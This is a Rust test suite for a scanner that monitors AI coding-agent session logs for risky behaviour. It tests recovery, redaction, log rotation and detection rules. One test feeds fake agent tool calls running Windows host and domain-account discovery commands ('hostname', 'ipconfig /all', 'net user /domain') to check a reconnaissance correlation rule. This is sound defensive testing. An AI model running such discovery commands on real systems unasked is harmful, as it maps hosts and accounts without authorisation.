        state["baseline_source_contributions"]
            .as_object()
            .unwrap()
            .is_empty()
    );
    // Quiesced coordinated backup; all subprocesses have exited. This is a
    // same-development-revision restore, not binary downgrade qualification.
    let backup = temp.path().join("backup");
    fs::create_dir(&backup).unwrap();
    let backup_state = backup.join("state.json");
    let backup_log = backup.join("events.jsonl");
    fs::copy(&state_path, &backup_state).unwrap();
    fs::copy(&log_path, &backup_log).unwrap();
    let baseline_log = fs::read(&backup_log).unwrap();

    let mut writer = Connection::open(&db_path).unwrap();
    let tx = writer.transaction().unwrap();
    for i in 0..5000 {
        tx.execute("insert into part values (?1,'message-a','session-a',1775000002000,1775000002000,'{\"type\":\"text\",\"text\":\"synthetic recovery\"}')", [format!("extra-{i}")]).unwrap();
    }
    tx.commit().unwrap();
    writer
        .execute(
            "update part set data=?1 where id='extra-0'",
            [serde_json::json!({"type": "text", "text": format!("synthetic-page-two-security-marker api_key={secret}")}).to_string()],
        )
        .unwrap();
    writer
        .execute(
            "update part set data=?1 where id='extra-4999'",
            [
                serde_json::json!({"type": "text", "text": format!("synthetic-page-two-security-marker api_key={secret}")})
                    .to_string(),
            ],
        )
        .unwrap();
    writer
        .execute(
            "update part set time_updated='invalid' where id='extra-4999'",
            [],
        )
        .unwrap();
    let malformed = scan();
    assert!(
        malformed.status.success(),
        "source errors remain scanner events"
    );
    let summary: Value = serde_json::from_slice(&malformed.stdout).unwrap();
    assert_eq!(summary["source_processing"]["parse_error_source_count"], 1);
    let after_error: Value = serde_json::from_slice(&fs::read(&state_path).unwrap()).unwrap();
    for key in [
        "sqlite_ingestion_cursors",
        "baseline_source_contributions",
        "baseline_snapshots",
    ] {
        assert_eq!(
            after_error[key], state[key],
            "partial source committed {key}"
        );
    }
    assert_eq!(summary["activity_count"], 0);
    let failed_log = fs::read(&log_path).unwrap();
    assert!(failed_log.starts_with(&baseline_log));
    let late_events = std::str::from_utf8(&failed_log[baseline_log.len()..])
        .unwrap()
        .lines()
        .map(|line| serde_json::from_str::<Value>(line).unwrap())
        .collect::<Vec<_>>();
    assert!(
        late_events
            .iter()
            .any(|event| event["event_type"] == "scanner_error")
    );
    assert!(
        !late_events.iter().any(|event| {
            event["event_type"] == "detection" || event["event_type"] == "activity"
        })
    );
    writer
        .execute(
            "update part set time_updated=1775000002000 where id='extra-4999'",
            [],
        )
        .unwrap();
    let before_output_failure = fs::read(&state_path).unwrap();
    // Valid paths pass preflight. JSONL takes this advisory lock only when
    // emitting nonempty output, after acquisition and atomic state preparation.
    let log_lock = fs::OpenOptions::new()
        .read(true)
        .write(true)
        .open(log_path.with_file_name("telltale-events.jsonl.lock"))
        .expect("existing JSONL sidecar");
    fs4::FileExt::lock(&log_lock).expect("hold exclusive JSONL lock before scan");
    let failed = scan();
    assert!(!failed.status.success());
    assert!(
        failed.stdout.is_empty(),
        "failed emission must not return a summary"
    );
    assert!(
        String::from_utf8_lossy(&failed.stderr).contains("resource busy; retry later"),
        "expected sink lock contention, stderr: {}",
        String::from_utf8_lossy(&failed.stderr)
    );
    assert_eq!(fs::read(&state_path).unwrap(), before_output_failure);
    assert_eq!(fs::read(&log_path).unwrap(), failed_log);
    fs4::FileExt::unlock(&log_lock).unwrap();
    drop(log_lock);
    let restarted = scan();
    assert!(
        restarted.status.success(),
        "{}",
        String::from_utf8_lossy(&restarted.stderr)
    );
    let summary: Value = serde_json::from_slice(&restarted.stdout).unwrap();
    assert_eq!(summary["source_processing"]["parsed_record_count"], 5002);
    assert_eq!(summary["source_processing"]["parse_error_source_count"], 0);
    let events: Vec<Value> = fs::read_to_string(&log_path)
        .unwrap()
        .lines()
        .map(|line| serde_json::from_str(line).unwrap())
        .collect();
    let detections = events
        .iter()
        .filter(|event| {
            event["event_type"] == "detection"
                && event["client"] == "opencode"
                && event["session_id"] == "session-a"
                && event["rule_ids"].as_array().is_some_and(|ids| {
                    ids.contains(&Value::String("synthetic.recovery.page_two".to_owned()))
                })
        })
        .collect::<Vec<_>>();
    assert_eq!(
        detections.len(),
        1,
        "recovery detection must persist exactly once"
    );
    assert_eq!(
        detections[0]["timeline_anchors"].as_array().unwrap().len(),
        2,
        "both early and late matching parts must survive recovery"
    );
    let recovered_activities = events
        .iter()
        .filter(|event| event["event_type"] == "activity")
        .count();
    assert_eq!(
        recovered_activities, 2,
        "baseline and recovery activity must persist"
    );
    let recovered_log = fs::read(&log_path).unwrap();
    assert!(recovered_log.starts_with(&failed_log));
    let recovered: Value = serde_json::from_slice(&fs::read(&state_path).unwrap()).unwrap();
    assert_eq!(
        recovered["sqlite_ingestion_cursors"]
            .as_object()
            .unwrap()
            .values()
            .next()
            .unwrap()["last_time_updated"],
        1_775_000_002_000_i64
    );
    let repeated = scan();
    assert!(repeated.status.success());
    let summary: Value = serde_json::from_slice(&repeated.stdout).unwrap();
    assert_eq!(summary["source_processing"]["parse_error_source_count"], 0);
    assert_eq!(
        fs::read(&log_path).unwrap(),
        recovered_log,
        "restart duplicated events"
    );

    // Preserve the post-recovery set before restoring both baseline artifacts.
    // The source remains ahead of the restored cursor and is replayed by the
    // exact same binary, without deleting state or using backfill.
    let quarantine = temp.path().join("post-recovery");
    fs::create_dir(&quarantine).unwrap();
    fs::copy(&state_path, quarantine.join("state.json")).unwrap();
    fs::copy(&log_path, quarantine.join("events.jsonl")).unwrap();
    fs::copy(&backup_state, &state_path).unwrap();
    fs::copy(&backup_log, &log_path).unwrap();
    assert_eq!(
        fs::read(&state_path).unwrap(),
        fs::read(&backup_state).unwrap()
    );
    assert_eq!(fs::read(&log_path).unwrap(), baseline_log);
    let restored = scan();
    assert!(restored.status.success());
    let summary: Value = serde_json::from_slice(&restored.stdout).unwrap();
    assert_eq!(summary["source_processing"]["parsed_record_count"], 5002);
    assert_eq!(summary["source_processing"]["parse_error_source_count"], 0);
    let restored_state: Value = serde_json::from_slice(&fs::read(&state_path).unwrap()).unwrap();
    let restored_cursors = restored_state["sqlite_ingestion_cursors"]
        .as_object()
        .unwrap();
    let recovered_cursors = recovered["sqlite_ingestion_cursors"].as_object().unwrap();
    assert_eq!(restored_cursors.len(), recovered_cursors.len());
    for (coordinate, cursor) in recovered_cursors {
        // Observation time is deliberately refreshed by the replay subprocess.
        for key in [
            "client",
            "source_id",
            "source_instance_id",
            "table",
            "last_time_updated",
        ] {
            assert_eq!(restored_cursors[coordinate][key], cursor[key]);
        }
    }
    assert_eq!(
        restored_state["baseline_source_contributions"],
        recovered["baseline_source_contributions"]
    );
    let restored_log = fs::read(&log_path).unwrap();
    assert!(restored_log.starts_with(&baseline_log));
    let replayed_events = std::str::from_utf8(&restored_log[baseline_log.len()..])
        .unwrap()
        .lines()
        .map(|line| serde_json::from_str::<Value>(line).unwrap())
        .collect::<Vec<_>>();
    let replayed_detections = replayed_events
        .iter()
        .filter(|event| event["event_type"] == "detection")
        .collect::<Vec<_>>();
    assert_eq!(replayed_detections.len(), 1);
    assert_eq!(
        replayed_events
            .iter()
            .filter(|event| event["event_type"] == "activity")
            .count(),
        1
    );
    for key in [
        "rule_ids",
        "session_id",
        "risk_score",
        "evidence",
        "timeline_anchors",
    ] {
        assert_eq!(
            replayed_detections[0][key], detections[0][key],
            "restore lost detection {key}"
        );
    }
    assert!(scan().status.success());
    assert_eq!(
        fs::read(&log_path).unwrap(),
        restored_log,
        "restored restart duplicated events"
    );
}

#[test]
fn scan_once_activity_includes_static_mcp_inventory_events() {
    let temp = tempdir().expect("tempdir");
    let root = temp.path().join("home");
    let log_path = temp.path().join("telltale-events.jsonl");
    let state_path = temp.path().join("telltale-state.json");
    fs::create_dir_all(&root).expect("root dir");
    fs::write(
        root.join(".mcp.json"),
        r#"{
            "mcpServers": {
                "github": {
                    "command": "npx",
                    "args": ["-y", "@modelcontextprotocol/server-github"],
                    "env": {"GITHUB_TOKEN": "synthetic-secret"},
                    "tools": [{"name": "list_issues"}, {"name": "create_issue"}]
                },
                "placeholder": {
                    "args": ["--flag-only"]
                }
            }
        }"#,
    )
    .expect("mcp config");

    let output = Command::new(env!("CARGO_BIN_EXE_telltale"))
        .args([
            "scan",
            "--once",
            "--emit-activity",
            "--no-local-config",
            "--root",
        ])
        .arg(&root)
        .args(["--log-path"])
        .arg(&log_path)
        .args(["--state-path"])
        .arg(&state_path)
        .output()
        .expect("run telltale");

    assert!(
        output.status.success(),
        "stderr: {}",
        String::from_utf8_lossy(&output.stderr)
    );

    let summary: Value = serde_json::from_slice(&output.stdout).expect("summary json");
    assert_eq!(summary["activity_count"], 2);

    let lines = fs::read_to_string(log_path).expect("log file");
    let events = lines
        .lines()
        .map(|line| serde_json::from_str::<Value>(line).expect("event json"))
        .collect::<Vec<_>>();
    let inventory = events
        .iter()
        .find(|event| {
            event["event_type"] == "activity"
                && event["session_id"] == "mcp_inventory"
                && event["tool_name"] == "mcp::github"
        })
        .expect("mcp inventory event");
    let schema: Value =
        serde_json::from_str(include_str!("../../schemas/event.schema.json")).expect("schema json");
    let validator = validator_for(&schema).expect("schema validator");
    assert!(
        validator.is_valid(inventory),
        "mcp inventory activity event should match schema: {inventory}"
    );
    let unsupported_inventory = events
        .iter()
        .find(|event| {
            event["event_type"] == "activity"
                && event["session_id"] == "mcp_inventory"
                && event["tool_name"] == "mcp::placeholder"
        })
        .expect("unsupported mcp inventory event");
    assert!(
        validator.is_valid(unsupported_inventory),
        "unsupported mcp inventory activity event should match schema: {unsupported_inventory}"
    );
    assert!(
        inventory["tags"]
            .as_array()
            .expect("tags")
            .iter()
            .any(|tag| tag == "mcp_inventory")
    );
    let evidence = inventory["evidence"][0]["redacted_value"]
        .as_str()
        .expect("evidence");
    assert!(evidence.contains("list_issues"));
    assert!(evidence.contains("GITHUB_TOKEN"));
    assert!(!evidence.contains("synthetic-secret"));
    assert!(
        unsupported_inventory["tags"]
            .as_array()
            .expect("unsupported tags")
            .iter()
            .any(|tag| tag == "mcp_inventory_unsupported")
    );
    let unsupported_evidence: Value = serde_json::from_str(
        unsupported_inventory["evidence"][0]["redacted_value"]
            .as_str()
            .expect("unsupported evidence"),
    )
    .expect("unsupported evidence json");
    assert_eq!(unsupported_evidence["supported"], false);
    assert_eq!(
        unsupported_evidence["unsupported_reason"],
        "missing_command_or_url"
    );
}

#[test]
fn scan_once_can_emit_session_risk_summary_events() {
    let temp = tempdir().expect("tempdir");
    let log_path = temp.path().join("telltale-events.jsonl");
    let state_path = temp.path().join("telltale-state.json");

    let output = Command::new(env!("CARGO_BIN_EXE_telltale"))
        .args([
            "scan",
            "--once",
            "--allow-fixtures",
            "--emit-activity",
            "--emit-session-risk-summary",
            "--no-local-config",
            "--root",
            "tests/fixtures/session_stores",
            "--log-path",
        ])
        .arg(&log_path)
        .args(["--state-path"])
        .arg(&state_path)
        .output()
        .expect("run telltale");

    assert!(
        output.status.success(),
        "stderr: {}",
        String::from_utf8_lossy(&output.stderr)
    );

    let summary: Value = serde_json::from_slice(&output.stdout).expect("summary json");
    assert!(
        summary["session_risk_summary_count"]
            .as_u64()
            .unwrap_or_default()
            > 0
    );

    let lines = fs::read_to_string(log_path).expect("log file");
    let events = lines
        .lines()
        .map(|line| serde_json::from_str::<Value>(line).expect("event json"))
        .collect::<Vec<_>>();
    let summary_events = events
        .iter()
        .filter(|event| event["event_type"] == "session_risk_summary")
        .collect::<Vec<_>>();
    assert!(!summary_events.is_empty(), "session risk summary events");
    let schema: Value =
        serde_json::from_str(include_str!("../../schemas/event.schema.json")).expect("schema json");
    let validator = validator_for(&schema).expect("schema validator");
    for summary_event in &summary_events {
        assert!(
            validator.is_valid(summary_event),
            "session_risk_summary event should match schema: {summary_event}"
        );
        let contribution_total = summary_event["risk_contributions"]
            .as_array()
            .expect("risk contributions")
            .iter()
            .map(|contribution| {
                contribution["points"]
                    .as_u64()
                    .expect("contribution points")
            })
            .sum::<u64>();
        assert_eq!(summary_event["risk_score"], contribution_total);
    }
    assert!(summary_events.iter().any(|event| {
        event["risk_score"].as_u64().unwrap_or_default() == 0
            && event["risk_contributions"]
                .as_array()
                .is_some_and(Vec::is_empty)
    }));
    let summary_event = summary_events
        .iter()
        .find(|event| event["risk_score"].as_u64().unwrap_or_default() > 0)
        .expect("positive session risk summary event");
    assert!(
        summary_event["tags"]
            .as_array()
            .expect("tags")
            .iter()
            .any(|tag| tag == "risk_summary")
    );
    assert!(
        summary_event["evidence"]
            .as_array()
            .expect("evidence")
            .iter()
            .any(|item| item["field"] == "event_counts")
    );
    assert!(
        summary_event["evidence"]
            .as_array()
            .expect("evidence")
            .iter()
            .any(|item| item["field"] == "risky_action_count")
    );
}

#[test]
fn scan_dry_run_session_risk_summary_does_not_write_log() {
    let temp = tempdir().expect("tempdir");
    let log_path = temp.path().join("telltale-events.jsonl");
    let state_path = temp.path().join("scan-state.json");

    let output = Command::new(env!("CARGO_BIN_EXE_telltale"))
        .args([
            "scan",
            "--once",
            "--dry-run",
            "--emit-activity",
            "--emit-session-risk-summary",
            "--no-local-config",
            "--root",
            "tests/fixtures/session_stores",
            "--log-path",
        ])
        .arg(&log_path)
        .args(["--state-path"])
        .arg(&state_path)
        .output()
        .expect("run telltale");

    assert!(
        output.status.success(),
        "stderr: {}",
        String::from_utf8_lossy(&output.stderr)
    );

    let summary: Value = serde_json::from_slice(&output.stdout).expect("summary json");
    assert_eq!(summary["log_path"], Value::Null);
    assert!(
        summary["session_risk_summary_count"]
            .as_u64()
            .unwrap_or_default()
            > 0
    );
    assert!(!log_path.exists(), "dry-run should not write JSONL output");
}

#[test]
fn scan_rotates_jsonl_when_max_size_exceeded() {
    let temp = tempdir().expect("tempdir");
    let fixture_root = std::env::current_dir()
        .expect("current dir")
        .join("tests/fixtures/session_stores");
    let log_path = temp.path().join("logs/telltale-events.jsonl");

    // First scan creates the file (no rotation since file doesn't exist yet).
    let output = Command::new(env!("CARGO_BIN_EXE_telltale"))
        .current_dir(temp.path())
        .args([
            "scan",
            "--once",
            "--allow-fixtures",
            "--root",
            fixture_root.to_str().expect("fixture path"),
            "--path-profile",
            "project",
            "--log-rotate-max-size",
            "1",
            "--log-rotate-keep",
            "3",
            "--max-sources",
            "1",
            "--emit-activity",
        ])
        .output()
        .expect("run telltale");

    assert!(
        output.status.success(),
        "first scan stderr: {}",
        String::from_utf8_lossy(&output.stderr)
    );
    assert!(
        log_path.exists(),
        "active log file should exist after first scan"
    );

    // Second scan should trigger rotation (file exists and exceeds 1 byte).
    let output = Command::new(env!("CARGO_BIN_EXE_telltale"))
        .current_dir(temp.path())
        .args([
            "scan",
            "--once",
            "--allow-fixtures",
            "--root",
            fixture_root.to_str().expect("fixture path"),
            "--path-profile",
            "project",
            "--log-rotate-max-size",
            "1",
            "--log-rotate-keep",
            "3",
            "--max-sources",
            "1",
            "--emit-activity",
            "--backfill",
        ])
        .output()
        .expect("run telltale");

    assert!(
        output.status.success(),
        "second scan stderr: {}",
        String::from_utf8_lossy(&output.stderr)
    );

    // The active file should still exist with fresh content.
    assert!(
        log_path.exists(),
        "active log file should exist after rotation"
    );

    // At least one rotated file should exist.
    let parent = log_path.parent().expect("parent");
    let rotated: Vec<_> = std::fs::read_dir(parent)
        .expect("read dir")
        .filter_map(Result::ok)
        .filter(|e| {
            let name = e.file_name();
            let name = name.to_string_lossy();
            name.starts_with("telltale-events-") && name.ends_with(".jsonl")
        })
        .collect();
    assert!(
        !rotated.is_empty(),
        "expected at least one rotated file after exceeding max size"
    );

    // Rotated file should have a date in the name.
    let rotated_name = rotated[0].file_name().to_string_lossy().to_string();
    assert!(
        rotated_name.contains("telltale-events-2"),
        "rotated file should be date-stamped: {rotated_name}"
    );
}

#[test]
fn scan_with_log_rotate_disabled_does_not_rotate() {
    let temp = tempdir().expect("tempdir");
    let fixture_root = std::env::current_dir()
        .expect("current dir")
        .join("tests/fixtures/session_stores");
    let log_path = temp.path().join("logs/telltale-events.jsonl");

    let output = Command::new(env!("CARGO_BIN_EXE_telltale"))
        .current_dir(temp.path())
        .args([
            "scan",
            "--once",
            "--allow-fixtures",
            "--root",
            fixture_root.to_str().expect("fixture path"),
            "--path-profile",
            "project",
            "--log-rotate-disabled",
            "--max-sources",
            "1",
        ])
        .output()
        .expect("run telltale");

    assert!(
        output.status.success(),
        "stderr: {}",
        String::from_utf8_lossy(&output.stderr)
    );

    assert!(log_path.exists(), "active log file should exist");

    // No rotated files should exist.
    let parent = log_path.parent().expect("parent");
    let rotated: Vec<_> = std::fs::read_dir(parent)
        .expect("read dir")
        .filter_map(Result::ok)
        .filter(|e| {
            let name = e.file_name();
            let name = name.to_string_lossy();
            name.starts_with("telltale-events-") && name.ends_with(".jsonl")
        })
        .collect();
    assert!(
        rotated.is_empty(),
        "no rotated files when --log-rotate-disabled is set"
    );
}

#[test]
fn scan_project_path_profile_separates_jsonl_telemetry_from_state() {
    let temp = tempdir().expect("tempdir");
    let fixture_root = std::env::current_dir()
        .expect("current dir")
        .join("tests/fixtures/session_stores");

    let output = Command::new(env!("CARGO_BIN_EXE_telltale"))
        .current_dir(temp.path())
        .args([
            "scan",
            "--once",
            "--allow-fixtures",
            "--root",
            fixture_root.to_str().expect("fixture path"),
            "--path-profile",
            "project",
            "--max-sources",
            "1",
        ])
        .output()
        .expect("run telltale");

    assert!(
        output.status.success(),
        "stderr: {}",
        String::from_utf8_lossy(&output.stderr)
    );

    let summary: Value = serde_json::from_slice(&output.stdout).expect("summary json");
    assert_eq!(summary["log_path"], "logs/telltale-events.jsonl");
    assert!(temp.path().join("logs/telltale-events.jsonl").is_file());
    assert!(temp.path().join("state/telltale-state.json").is_file());
    assert!(!temp.path().join("logs/telltale-state.json").exists());
}

#[test]
fn scan_uses_env_log_and_state_defaults() {
    let temp = tempdir().expect("tempdir");
    let fixture_root = std::env::current_dir()
        .expect("current dir")
        .join("tests/fixtures/session_stores");
    let log_path = temp.path().join("env-logs/telltale-events.jsonl");
    let state_path = temp.path().join("env-state/telltale-state.json");

    let output = Command::new(env!("CARGO_BIN_EXE_telltale"))
        .current_dir(temp.path())
        .env("TELLTALE_LOG_PATH", &log_path)
        .env("TELLTALE_STATE_PATH", &state_path)
        .args([
            "scan",
            "--once",
            "--allow-fixtures",
            "--root",
            fixture_root.to_str().expect("fixture path"),
            "--max-sources",
            "1",
        ])
        .output()
        .expect("run telltale");

    assert!(
        output.status.success(),
        "stderr: {}",
        String::from_utf8_lossy(&output.stderr)
    );

    let summary: Value = serde_json::from_slice(&output.stdout).expect("summary json");
    assert_eq!(summary["log_path"], "[sensitive-path]");
    assert!(log_path.is_file());
    assert!(state_path.is_file());
    assert!(!temp.path().join("logs/telltale-events.jsonl").exists());
    assert!(!temp.path().join("state/telltale-state.json").exists());
}

#[test]
fn scan_invalid_root_reports_privacy_safe_fallback_diagnostics() {
    let temp = tempdir().expect("tempdir");
    let root = temp.path().join("invalid-root-sentinel");
    let state_path = temp.path().join("telltale-state.json");
    let output = Command::new(env!("CARGO_BIN_EXE_telltale"))
        .args(["scan", "--once", "--dry-run", "--no-local-config", "--root"])
        .arg(&root)
        .arg("--state-path")
        .arg(&state_path)
        .output()
        .expect("run telltale");

    assert!(
        output.status.success(),
        "stderr: {}",
        String::from_utf8_lossy(&output.stderr)
    );
    let stdout = String::from_utf8_lossy(&output.stdout);
    let stderr = String::from_utf8_lossy(&output.stderr);
    assert!(!stdout.contains("invalid-root-sentinel"));
    assert!(!stderr.contains("invalid-root-sentinel"));
    let summary: Value = serde_json::from_slice(&output.stdout).expect("summary json");
    assert_eq!(summary["source_discovery"]["checked_status"], "first_error");
    assert_eq!(
        summary["source_discovery"]["first_error_category"],
        "invalid_root"
    );
    assert_eq!(
        summary["source_discovery"]["best_effort_fallback_used"],
        true
    );
    assert_eq!(summary["source_discovery"]["returned_source_count"], 0);
    assert_eq!(summary["source_discovery"]["operational_source_count"], 0);
    assert_eq!(
        summary["diagnostic_warnings"],
        serde_json::json!([
            {
                "code": "source_discovery_degraded",
                "classification": "observed_failure",
                "basis": "source_discovery"
            },
            {
                "code": "no_sources_selected",
                "classification": "suspicious_zero",
                "basis": "source_selection"
            }
        ])
    );
}

#[test]
fn project_config_failures_are_aggregated_without_path_or_error_leakage() {
    let temp = tempdir().expect("tempdir");
    let root = temp.path().join("invalid-root-sentinel");
    let project = temp.path().join("valid-project");
    fs::create_dir_all(project.join("logs/copilot")).expect("project");
    fs::copy(
        "tests/fixtures/session_stores/copilot/process-uc001.log",
        project.join("logs/copilot/process-uc001.log"),
    )
    .expect("copilot project source");
    let good_config = temp.path().join("good-projects.yaml");
    let bad_config = temp.path().join("bad-projects-error-sentinel.yaml");
    fs::write(
        &good_config,
        format!(
            "projects:\n  - name: valid\n    path: '{}'\n",
            project.display()
        ),
    )
    .expect("good project config");
    fs::write(&bad_config, "projects: [not valid yaml").expect("bad project config");
    let log_path = temp.path().join("events.jsonl");
    let state_path = temp.path().join("state.json");
    let output = Command::new(env!("CARGO_BIN_EXE_telltale"))
        .args(["scan", "--once", "--no-local-config", "--root"])
        .arg(&root)
        .args(["--project-config"])
        .arg(&good_config)
        .args(["--project-config"])
        .arg(&bad_config)
        .args(["--log-path"])
        .arg(&log_path)
        .args(["--state-path"])
        .arg(&state_path)
        .output()
        .expect("run telltale");

    assert!(
        output.status.success(),
        "stderr: {}",
        String::from_utf8_lossy(&output.stderr)
    );
    let stdout = String::from_utf8_lossy(&output.stdout);
    let stderr = String::from_utf8_lossy(&output.stderr);
    for sentinel in ["bad-projects-error-sentinel", "not valid yaml"] {
        assert!(!stdout.contains(sentinel));
        assert!(!stderr.contains(sentinel));
    }
    let summary: Value = serde_json::from_slice(&output.stdout).expect("summary json");
    assert_eq!(summary["source_discovery"]["checked_status"], "first_error");
    assert_eq!(
        summary["source_discovery"]["first_error_category"],
        "invalid_root"
    );
    assert_eq!(
        summary["source_discovery"]["best_effort_fallback_used"],
        true
    );
    assert!(
        summary["source_discovery"]["returned_source_count"]
            .as_u64()
            .unwrap()
            > 0
    );
    assert!(
        summary["diagnostic_warnings"]
            .as_array()
            .unwrap()
            .iter()
            .any(|warning| warning["code"] == "source_discovery_degraded")
    );
    assert_eq!(
        summary["source_discovery"]["project_configuration"],
        serde_json::json!({
            "mode": "configured_documents",
            "document_attempt_count": 2,
            "document_success_count": 1,
            "document_failure_count": 1,
            "loaded_project_count": 1,
        })
    );
    assert!(
        summary["diagnostic_warnings"]
            .as_array()
            .unwrap()
            .iter()
            .any(|warning| warning["code"] == "project_config_load_failed")
    );
    let events = fs::read_to_string(&log_path).expect("events");
    assert!(!events.contains("bad-projects-error-sentinel"));
    assert!(!events.contains("not valid yaml"));
}

#[test]
fn scan_once_continues_after_malformed_source() {
    let temp = tempdir().expect("tempdir");
    let root = temp.path().join("session_stores");
    let codex_sessions = root.join("codex/sessions");
    fs::create_dir_all(&codex_sessions).expect("codex sessions dir");
    fs::write(
        codex_sessions.join("malformed-source.jsonl"),
        include_str!("../../tests/fixtures/rule_samples/malformed-source.jsonl"),
    )
    .expect("malformed fixture");
    fs::write(
        codex_sessions.join("uc001-positive.jsonl"),
        include_str!(
            "../../tests/fixtures/session_stores/codex/sessions/2026/04/uc001-positive.jsonl"
        ),
    )
    .expect("positive fixture");

    let log_path = temp.path().join("telltale-events.jsonl");
    let state_path = temp.path().join("telltale-state.json");
    let output = Command::new(env!("CARGO_BIN_EXE_telltale"))
        .args([
            "scan",
            "--once",
            "--allow-fixtures",
            "--no-local-config",
            "--root",
        ])
        .arg(&root)
        .args(["--install-inventory-disabled", "--log-path"])
        .arg(&log_path)
        .args(["--state-path"])
        .arg(&state_path)
        .output()
        .expect("run telltale");

    assert!(
        output.status.success(),
        "stderr: {}",
        String::from_utf8_lossy(&output.stderr)
    );
    let summary: Value = serde_json::from_slice(&output.stdout).expect("summary json");
    assert_eq!(summary["detection_count"], 2);
    assert_eq!(summary["emitted_count"], 2);
    assert_eq!(summary["source_processing"]["selected_source_count"], 2);
    assert_eq!(
        summary["source_processing"]["parse_success_source_count"],
        1
    );
    assert_eq!(summary["source_processing"]["empty_source_count"], 0);
    assert_eq!(summary["source_processing"]["parse_error_source_count"], 1);
    assert_detection_flow_accounting(&summary, 1, 0);
    assert_eq!(
        summary["diagnostic_warnings"],
        serde_json::json!([
            {
                "code": "source_parse_error_observed",
                "classification": "observed_failure",
                "basis": "source_processing"
            },
            {
                "code": "source_coverage_partial",
                "classification": "coverage_limitation",
                "basis": "source_processing"
            },
            {
                "code": "no_tool_records_observed",
                "classification": "suspicious_zero",
                "basis": "source_processing"
            }
        ])
    );
    assert_eq!(summary["source_counts"]["codex.jsonl"], 2);

    let lines = fs::read_to_string(log_path).expect("log file");
    let events = lines
        .lines()
        .map(|line| serde_json::from_str::<Value>(line).expect("event json"))
        .collect::<Vec<_>>();
    assert_eq!(events.len(), 3);
    assert!(events.iter().any(|event| event["event_type"] == "detection"
        && event["session_id"] == "uc001-positive"
        && event["severity"] == "critical"));
    assert!(events.iter().any(|event| {
        event["event_type"] == "scanner_error"
            && event["severity"] == "informational"
            && event["session_id"] == "scanner"
            && event["tags"]
                .as_array()
                .unwrap()
                .contains(&Value::String("parse_failure".to_string()))
    }));
}

#[test]
fn scan_preserves_process_chain_correlation_then_ordinary_detection_order_with_policy() {
    let temp = tempdir().expect("tempdir");
    let root = temp.path().join("session_stores");
    let sessions = root.join("codex/sessions");
    fs::create_dir_all(&sessions).unwrap();
    let mut records =
        include_str!("../fixtures/custom_rules/custom-agent-behavior.jsonl").to_string();
    for (index, command) in [
        "cmd.exe /c hostname",
        "cmd.exe /c ipconfig /all",
        "cmd.exe /c net user /domain",
    ]
    .into_iter()
    .enumerate()
    {
        records.push_str(
            &serde_json::json!({
                "type": "response_item",
                "timestamp": format!("2026-05-08T10:0{index}:02Z"),
                "payload": {"type": "tool_call", "name": "shell", "arguments": command}
            })
            .to_string(),
        );
        records.push('\n');
    }
    fs::write(sessions.join("analysis.jsonl"), records).unwrap();
    let policy = temp.path().join("policy.yaml");
    fs::write(&policy, "name: analysis-order\n").unwrap();
    let log = temp.path().join("events.jsonl");
    let output = Command::new(env!("CARGO_BIN_EXE_telltale"))
        .args([
            "scan",
            "--once",
            "--allow-fixtures",
            "--no-local-config",
            "--client",
            "codex",
            "--no-default-rules",
            "--rules",
        ])
        .arg(concat!(
            env!("CARGO_MANIFEST_DIR"),
            "/tests/fixtures/custom_rules/sigma-inspired-agent-behavior.yaml"
        ))
        .arg("--policy")
        .arg(&policy)
        .arg("--root")
        .arg(&root)
        .arg("--log-path")
        .arg(&log)
        .arg("--state-path")
        .arg(temp.path().join("state.json"))
        .env("TELLTALE_PROCESS_CHAIN_DETECTIONS", "1")
        .output()
        .unwrap();
    assert!(
        output.status.success(),
        "{}",
        String::from_utf8_lossy(&output.stderr)
    );
    let events: Vec<Value> = fs::read_to_string(log)
        .unwrap()
        .lines()
        .map(|line| serde_json::from_str(line).unwrap())
        .collect();
    let analysis: Vec<&Value> = events
        .iter()
        .filter(|event| {
            matches!(
                event["event_type"].as_str(),
                Some("process_chain" | "correlation" | "detection" | "scanner_error")
            )
        })
        .collect();
    assert_eq!(
        analysis
            .iter()
            .map(|event| event["event_type"].as_str().unwrap())
            .collect::<Vec<_>>(),
        [
            "process_chain",
            "process_chain",
            "process_chain",
            "process_chain",
            "detection"
        ]
    );
    assert_eq!(
        analysis[3]["rule_ids"][0],
        "procchain.correlation.host_then_account_discovery"
    );
    assert_eq!(
        analysis[3]["signal_types"],
        serde_json::json!(["correlation"])
    );
    assert_eq!(
        analysis[4]["rule_ids"][0],
        "custom.agent.malicious_behavior"
    );
    let summary: Value = serde_json::from_slice(&output.stdout).unwrap();
    assert_eq!(
        summary["detection_flow"]["policy_match_accounting"],
        serde_json::json!({
            "status": "available",
            "pre_policy_detection_candidate_count": 1,
            "fully_filtered_detection_candidate_count": 0,
            "filtered_rule_id_count": 0
        })
    );
}

#[test]
fn scan_once_refuses_fixture_root_without_allow_fixtures() {
    let temp = tempdir().expect("tempdir");
    let log_path = temp.path().join("telltale-events.jsonl");
    let state_path = temp.path().join("telltale-state.json");

    let output = Command::new(env!("CARGO_BIN_EXE_telltale"))
        .args([
            "scan",
            "--once",
            "--root",
            "tests/fixtures/session_stores",
            "--log-path",
        ])
        .arg(&log_path)
        .args(["--state-path"])
        .arg(&state_path)
        .output()
        .expect("run telltale");

    assert!(!output.status.success());
    let stderr = String::from_utf8_lossy(&output.stderr);
    assert!(stderr.contains("refusing to write fixture/demo data"));
    assert!(!log_path.exists());
}

#[test]
fn scan_once_allows_fixture_root_with_dry_run() {
    let temp = tempdir().expect("tempdir");
    let log_path = temp.path().join("telltale-events.jsonl");
    let state_path = temp.path().join("telltale-state.json");

    let output = Command::new(env!("CARGO_BIN_EXE_telltale"))
        .args([
            "scan",
            "--once",
            "--dry-run",
            "--no-local-config",
            "--root",
            "tests/fixtures/session_stores",
            "--log-path",
        ])
        .arg(&log_path)
        .args(["--state-path"])
        .arg(&state_path)
        .output()
        .expect("run telltale");

    assert!(
        output.status.success(),
        "stderr: {}",
        String::from_utf8_lossy(&output.stderr)
    );
    let summary: Value = serde_json::from_slice(&output.stdout).expect("summary json");
    assert_eq!(summary["event_type"], "health");
    assert_eq!(summary["detection_count"], 30);
}

#[test]
fn watch_command_is_available_for_realtime_scans() {
    let output = Command::new(env!("CARGO_BIN_EXE_telltale"))
        .args(["watch", "--help"])
        .output()
        .expect("run telltale watch help");

    assert!(
        output.status.success(),
        "watch help failed: {}",
        String::from_utf8_lossy(&output.stderr)
    );
    let stdout = String::from_utf8_lossy(&output.stdout);
    assert!(stdout.contains("Watch local session stores"));
    assert!(stdout.contains("--debounce-ms"));
    assert!(stdout.contains("--min-scan-interval-ms"));
    assert!(stdout.contains("--iterations"));
    assert!(stdout.contains("--client"));
}

